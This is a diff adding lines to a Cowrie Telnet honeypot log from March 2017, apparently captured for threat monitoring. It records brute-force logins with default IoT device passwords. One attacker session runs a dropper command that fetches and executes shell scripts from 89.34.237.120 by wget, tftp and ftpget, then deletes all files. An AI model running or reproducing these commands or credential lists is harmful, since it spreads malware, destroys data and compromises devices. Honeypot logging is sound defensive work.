@@ -1334,3 +1334,136 @@
 2017-03-03T22:12:55+0000 [CowrieTelnetTransport,36177,95.32.6.1] Opening TTY Log: log/tty/20170303-221255-None-36177i.log
 2017-03-03T22:12:55+0000 [CowrieTelnetTransport,36177,95.32.6.1] Warning: state changed and new state returned
 2017-03-03T22:13:00+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 59.93.231.62:48096 (10.8.41.81:2223) [session: TT36183]
+2017-03-03T22:13:02+0000 [CowrieTelnetTransport,36183,59.93.231.62] login attempt: 14
+2017-03-03T22:13:02+0000 [CowrieTelnetTransport,36183,59.93.231.62] login return, expect: [root/admin]
+2017-03-03T22:13:03+0000 [CowrieTelnetTransport,36183,59.93.231.62] login attempt [root/xc3511] failed
+2017-03-03T22:13:03+0000 [CowrieTelnetTransport,36183,59.93.231.62] Warning: state changed and new state returned
+2017-03-03T22:13:03+0000 [CowrieTelnetTransport,36178,59.93.231.62] Closing TTY Log: log/tty/20170303-221233-None-36178i.log after 29 seconds
+2017-03-03T22:13:03+0000 [CowrieTelnetTransport,36178,59.93.231.62] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-03-03T22:13:03+0000 [CowrieTelnetTransport,36178,59.93.231.62] Connection lost after 33 seconds
+2017-03-03T22:13:04+0000 [CowrieTelnetTransport,36183,59.93.231.62] login attempt: 15
+2017-03-03T22:13:04+0000 [CowrieTelnetTransport,36183,59.93.231.62] login return, expect: [root/admin]
+2017-03-03T22:13:05+0000 [CowrieTelnetTransport,36183,59.93.231.62] login attempt [enable\x00/system\x00] failed
+2017-03-03T22:13:05+0000 [CowrieTelnetTransport,36183,59.93.231.62] Warning: state changed and new state returned
+2017-03-03T22:13:06+0000 [CowrieTelnetTransport,36183,59.93.231.62] login attempt: 16
+2017-03-03T22:13:06+0000 [CowrieTelnetTransport,36183,59.93.231.62] login return, expect: [root/admin]
+2017-03-03T22:13:07+0000 [CowrieTelnetTransport,36183,59.93.231.62] login attempt [shell\x00/sh\x00] failed
+2017-03-03T22:13:07+0000 [CowrieTelnetTransport,36183,59.93.231.62] Warning: state changed and new state returned
+2017-03-03T22:13:13+0000 [CowrieTelnetTransport,36177,95.32.6.1] CMD: sh
+2017-03-03T22:13:13+0000 [CowrieTelnetTransport,36177,95.32.6.1] Command found: sh 
+2017-03-03T22:13:14+0000 [CowrieTelnetTransport,36180,59.93.231.62] Connection lost after 40 seconds
+2017-03-03T22:13:14+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 59.93.231.62:48179 (10.8.41.81:2223) [session: TT36184]
+2017-03-03T22:13:16+0000 [CowrieTelnetTransport,36179,59.93.231.62] Connection lost after 46 seconds
+2017-03-03T22:13:16+0000 [CowrieTelnetTransport,36184,59.93.231.62] login attempt: 17
+2017-03-03T22:13:16+0000 [CowrieTelnetTransport,36184,59.93.231.62] login return, expect: [root/admin]
+2017-03-03T22:13:17+0000 [CowrieTelnetTransport,36184,59.93.231.62] login attempt [root/00000000] failed
+2017-03-03T22:13:17+0000 [CowrieTelnetTransport,36184,59.93.231.62] Warning: state changed and new state returned
+2017-03-03T22:13:17+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 59.93.231.62:48184 (10.8.41.81:2223) [session: TT36185]
+2017-03-03T22:13:17+0000 [CowrieTelnetTransport,36177,95.32.6.1] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.237.120/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 89.34.237.120 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 89.34.237.120; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 89.34.237.120 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
+2017-03-03T22:13:17+0000 [CowrieTelnetTransport,36177,95.32.6.1] Command found: cd /tmp
+2017-03-03T22:13:17+0000 [CowrieTelnetTransport,36177,95.32.6.1] Command found: cd /var/run
+2017-03-03T22:13:17+0000 [CowrieTelnetTransport,36177,95.32.6.1] Command found: cd /mnt
+2017-03-03T22:13:17+0000 [CowrieTelnetTransport,36177,95.32.6.1] Command found: cd /root
+2017-03-03T22:13:17+0000 [CowrieTelnetTransport,36177,95.32.6.1] Command found: cd /
+2017-03-03T22:13:17+0000 [CowrieTelnetTransport,36177,95.32.6.1] Command found: wget http://89.34.237.120/bins.sh
+2017-03-03T22:13:17+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://89.34.237.120/bins.sh>
+2017-03-03T22:13:17+0000 [Uninitialized] Command found: chmod 777 bins.sh
+2017-03-03T22:13:17+0000 [Uninitialized] Command found: sh bins.sh
+2017-03-03T22:13:17+0000 [Uninitialized] Command found: tftp 89.34.237.120 -c get tftp1.sh
+2017-03-03T22:13:17+0000 [Uninitialized] Command found: chmod 777 tftp1.sh
+2017-03-03T22:13:17+0000 [Uninitialized] Command found: sh tftp1.sh
+2017-03-03T22:13:17+0000 [Uninitialized] Command found: tftp -r tftp2.sh -g 89.34.237.120
+2017-03-03T22:13:17+0000 [Uninitialized] Command found: chmod 777 tftp2.sh
+2017-03-03T22:13:17+0000 [Uninitialized] Command found: sh tftp2.sh
+2017-03-03T22:13:17+0000 [Uninitialized] Command found: ftpget -v -u anonymous -p anonymous -P 21 89.34.237.120 ftp1.sh ftp1.sh
+2017-03-03T22:13:17+0000 [Uninitialized] FTP connect failed: host=89.34.237.120, port=21, err=[Errno 111] Connection refused
+2017-03-03T22:13:17+0000 [Uninitialized] Command found: sh ftp1.sh
+2017-03-03T22:13:17+0000 [Uninitialized] Command found: rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh
+2017-03-03T22:13:17+0000 [Uninitialized] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-03-03T22:13:17+0000 [Uninitialized] Command found: exit 
+2017-03-03T22:13:17+0000 [Uninitialized] Process ended. Telnet Session disconnected
+2017-03-03T22:13:17+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://89.34.237.120/bins.sh>
+2017-03-03T22:13:17+0000 [CowrieTelnetTransport,36177,95.32.6.1] Closing TTY Log: log/tty/20170303-221255-None-36177i.log after 22 seconds
+2017-03-03T22:13:17+0000 [CowrieTelnetTransport,36177,95.32.6.1] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-03-03T22:13:17+0000 [CowrieTelnetTransport,36177,95.32.6.1] Connection lost after 59 seconds
+2017-03-03T22:13:18+0000 [CowrieTelnetTransport,36184,59.93.231.62] login attempt: 18
+2017-03-03T22:13:18+0000 [CowrieTelnetTransport,36184,59.93.231.62] login return, expect: [root/admin]
+2017-03-03T22:13:19+0000 [CowrieTelnetTransport,36184,59.93.231.62] login attempt [enable\x00/system\x00] failed
+2017-03-03T22:13:19+0000 [CowrieTelnetTransport,36184,59.93.231.62] Warning: state changed and new state returned
+2017-03-03T22:13:19+0000 [CowrieTelnetTransport,36185,59.93.231.62] login attempt: 19
+2017-03-03T22:13:19+0000 [CowrieTelnetTransport,36185,59.93.231.62] login return, expect: [root/admin]
+2017-03-03T22:13:20+0000 [CowrieTelnetTransport,36185,59.93.231.62] login attempt [root/xmhdipc] failed
+2017-03-03T22:13:20+0000 [CowrieTelnetTransport,36185,59.93.231.62] Warning: state changed and new state returned
+2017-03-03T22:13:20+0000 [CowrieTelnetTransport,36181,59.93.231.62] Connection lost after 43 seconds
+2017-03-03T22:13:21+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 59.93.231.62:48210 (10.8.41.81:2223) [session: TT36186]
+2017-03-03T22:13:21+0000 [CowrieTelnetTransport,36184,59.93.231.62] login attempt: 20
+2017-03-03T22:13:21+0000 [CowrieTelnetTransport,36184,59.93.231.62] login return, expect: [root/admin]
+2017-03-03T22:13:22+0000 [CowrieTelnetTransport,36184,59.93.231.62] login attempt [shell\x00/sh\x00] failed
+2017-03-03T22:13:22+0000 [CowrieTelnetTransport,36184,59.93.231.62] Warning: state changed and new state returned
+2017-03-03T22:13:23+0000 [CowrieTelnetTransport,36186,59.93.231.62] login attempt: 21
+2017-03-03T22:13:23+0000 [CowrieTelnetTransport,36186,59.93.231.62] login return, expect: [root/admin]
+2017-03-03T22:13:23+0000 [CowrieTelnetTransport,36186,59.93.231.62] login attempt [root/12345] failed
+2017-03-03T22:13:23+0000 [CowrieTelnetTransport,36186,59.93.231.62] Warning: state changed and new state returned
+2017-03-03T22:13:24+0000 [CowrieTelnetTransport,36185,59.93.231.62] login attempt: 22
+2017-03-03T22:13:24+0000 [CowrieTelnetTransport,36185,59.93.231.62] login return, expect: [root/admin]
+2017-03-03T22:13:25+0000 [CowrieTelnetTransport,36185,59.93.231.62] login attempt [enable\x00/system\x00] failed
+2017-03-03T22:13:25+0000 [CowrieTelnetTransport,36185,59.93.231.62] Warning: state changed and new state returned
+2017-03-03T22:13:25+0000 [CowrieTelnetTransport,36186,59.93.231.62] login attempt: 23
+2017-03-03T22:13:25+0000 [CowrieTelnetTransport,36186,59.93.231.62] login return, expect: [root/admin]
+2017-03-03T22:13:26+0000 [CowrieTelnetTransport,36186,59.93.231.62] login attempt [enable\x00/system\x00] failed
+2017-03-03T22:13:26+0000 [CowrieTelnetTransport,36186,59.93.231.62] Warning: state changed and new state returned
+2017-03-03T22:13:26+0000 [CowrieTelnetTransport,36182,59.93.231.62] Connection lost after 42 seconds
+2017-03-03T22:13:26+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 59.93.231.62:48240 (10.8.41.81:2223) [session: TT36187]
+2017-03-03T22:13:27+0000 [CowrieTelnetTransport,36185,59.93.231.62] login attempt: 24
+2017-03-03T22:13:27+0000 [CowrieTelnetTransport,36185,59.93.231.62] login return, expect: [root/admin]
+2017-03-03T22:13:28+0000 [CowrieTelnetTransport,36185,59.93.231.62] login attempt [shell\x00/sh\x00] failed
+2017-03-03T22:13:28+0000 [CowrieTelnetTransport,36185,59.93.231.62] Warning: state changed and new state returned
+2017-03-03T22:13:28+0000 [CowrieTelnetTransport,36186,59.93.231.62] login attempt: 25
+2017-03-03T22:13:28+0000 [CowrieTelnetTransport,36186,59.93.231.62] login return, expect: [root/admin]
+2017-03-03T22:13:29+0000 [CowrieTelnetTransport,36186,59.93.231.62] login attempt [shell\x00/sh\x00] failed
+2017-03-03T22:13:29+0000 [CowrieTelnetTransport,36186,59.93.231.62] Warning: state changed and new state returned
+2017-03-03T22:13:30+0000 [CowrieTelnetTransport,36187,59.93.231.62] login attempt: 26
+2017-03-03T22:13:30+0000 [CowrieTelnetTransport,36187,59.93.231.62] login return, expect: [root/admin]
+2017-03-03T22:13:31+0000 [CowrieTelnetTransport,36187,59.93.231.62] login attempt [root/hi3518] failed
+2017-03-03T22:13:31+0000 [CowrieTelnetTransport,36187,59.93.231.62] Warning: state changed and new state returned
+2017-03-03T22:13:32+0000 [CowrieTelnetTransport,36187,59.93.231.62] login attempt: 27
+2017-03-03T22:13:32+0000 [CowrieTelnetTransport,36187,59.93.231.62] login return, expect: [root/admin]
+2017-03-03T22:13:33+0000 [CowrieTelnetTransport,36187,59.93.231.62] login attempt [enable\x00/system\x00] failed
+2017-03-03T22:13:33+0000 [CowrieTelnetTransport,36187,59.93.231.62] Warning: state changed and new state returned
+2017-03-03T22:13:34+0000 [CowrieTelnetTransport,36187,59.93.231.62] login attempt: 28
+2017-03-03T22:13:34+0000 [CowrieTelnetTransport,36187,59.93.231.62] login return, expect: [root/admin]
+2017-03-03T22:13:35+0000 [CowrieTelnetTransport,36187,59.93.231.62] login attempt [shell\x00/sh\x00] failed
+2017-03-03T22:13:35+0000 [CowrieTelnetTransport,36187,59.93.231.62] Warning: state changed and new state returned
+2017-03-03T22:13:39+0000 [CowrieTelnetTransport,36183,59.93.231.62] Connection lost after 39 seconds
+2017-03-03T22:13:40+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 59.93.231.62:48339 (10.8.41.81:2223) [session: TT36188]
+2017-03-03T22:13:42+0000 [CowrieTelnetTransport,36188,59.93.231.62] login attempt: 29
+2017-03-03T22:13:42+0000 [CowrieTelnetTransport,36188,59.93.231.62] login return, expect: [root/admin]
+2017-03-03T22:13:42+0000 [CowrieTelnetTransport,36188,59.93.231.62] login attempt [root/xmhdipc] failed
+2017-03-03T22:13:42+0000 [CowrieTelnetTransport,36188,59.93.231.62] Warning: state changed and new state returned
+2017-03-03T22:13:44+0000 [CowrieTelnetTransport,36188,59.93.231.62] login attempt: 30
+2017-03-03T22:13:44+0000 [CowrieTelnetTransport,36188,59.93.231.62] login return, expect: [root/admin]
+2017-03-03T22:13:45+0000 [CowrieTelnetTransport,36188,59.93.231.62] login attempt [enable\x00/system\x00] failed
+2017-03-03T22:13:45+0000 [CowrieTelnetTransport,36188,59.93.231.62] Warning: state changed and new state returned
+2017-03-03T22:13:46+0000 [CowrieTelnetTransport,36188,59.93.231.62] login attempt: 31
+2017-03-03T22:13:46+0000 [CowrieTelnetTransport,36188,59.93.231.62] login return, expect: [root/admin]
+2017-03-03T22:13:47+0000 [CowrieTelnetTransport,36188,59.93.231.62] login attempt [shell\x00/sh\x00] failed
+2017-03-03T22:13:47+0000 [CowrieTelnetTransport,36188,59.93.231.62] Warning: state changed and new state returned
+2017-03-03T22:13:54+0000 [CowrieTelnetTransport,36184,59.93.231.62] Connection lost after 39 seconds
+2017-03-03T22:13:54+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 59.93.231.62:48466 (10.8.41.81:2223) [session: TT36189]
+2017-03-03T22:13:56+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 120.199.111.212:54586 (10.8.41.81:2223) [session: TT36190]
+2017-03-03T22:13:57+0000 [CowrieTelnetTransport,36189,59.93.231.62] login attempt: 32
+2017-03-03T22:13:57+0000 [CowrieTelnetTransport,36189,59.93.231.62] login return, expect: [root/admin]
+2017-03-03T22:13:57+0000 [CowrieTelnetTransport,36189,59.93.231.62] login attempt [root/xmhdipc] failed
+2017-03-03T22:13:57+0000 [CowrieTelnetTransport,36189,59.93.231.62] Warning: state changed and new state returned
+2017-03-03T22:13:58+0000 [CowrieTelnetTransport,36190,120.199.111.212] login attempt: 18
+2017-03-03T22:13:58+0000 [CowrieTelnetTransport,36190,120.199.111.212] login return, expect: [root/123456]
+2017-03-03T22:13:59+0000 [CowrieTelnetTransport,36190,120.199.111.212] login attempt [root/] failed
+2017-03-03T22:13:59+0000 [CowrieTelnetTransport,36190,120.199.111.212] Warning: state changed and new state returned
+2017-03-03T22:14:00+0000 [CowrieTelnetTransport,36189,59.93.231.62] login attempt: 33
+2017-03-03T22:14:00+0000 [CowrieTelnetTransport,36189,59.93.231.62] login return, expect: [root/admin]
+2017-03-03T22:14:01+0000 [CowrieTelnetTransport,36189,59.93.231.62] login attempt [enable\x00/system\x00] failed
+2017-03-03T22:14:01+0000 [CowrieTelnetTransport,36189,59.93.231.62] Warning: state changed and new state returned
+2017-03-03T22:14:01+0000 [CowrieTelnetTransport,36190,120.199.111.212] login attempt: 19
+2017-03-03T22:14:01+0000 [CowrieTelnetTransport,36190,120.199.111.212] login return, expect: [root/123456]
